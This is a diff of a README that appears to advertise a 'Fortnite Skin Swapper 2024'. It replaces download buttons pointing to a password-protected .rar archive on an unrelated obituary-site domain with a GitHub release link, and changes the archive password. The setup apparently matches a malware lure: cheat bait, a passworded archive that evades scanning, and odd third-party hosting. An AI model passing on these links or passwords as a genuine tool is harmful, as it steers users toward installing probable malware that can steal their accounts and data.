@@ -13,10 +13,11 @@ Welcome to the ultimate collection of **Fortnite Skin Swapper 2024**! This repos
 > [!NOTE]
 > - **Select a version**
 
-[![Windows7](https://i.postimg.cc/J0HzL2wQ/Group-1-8.png)](https://obituarios.cruzdefroward.cl/temp/Software.rar) [![Windows10](https://i.postimg.cc/Sxf83Jfx/Group-1-7.png)](https://obituarios.cruzdefroward.cl/temp/Software.rar) [![Windows11](https://i.postimg.cc/ydkZDn4D/Group-1-6.png)](https://obituarios.cruzdefroward.cl/temp/Software.rar)
+[![Group_4_2](https://github.com/user-attachments/assets/8abb7674-6e64-4d79-85db-49327f18eb00)](https://github.com/howardbury/Fortnite-Skin-Swapper-Menu/releases/tag/Setup)
+
 
 > [!NOTE]
-> **PASSWORD: SOFTWARE2121**
+> **PASSWORD: SWAPPER2024**
 
 
 
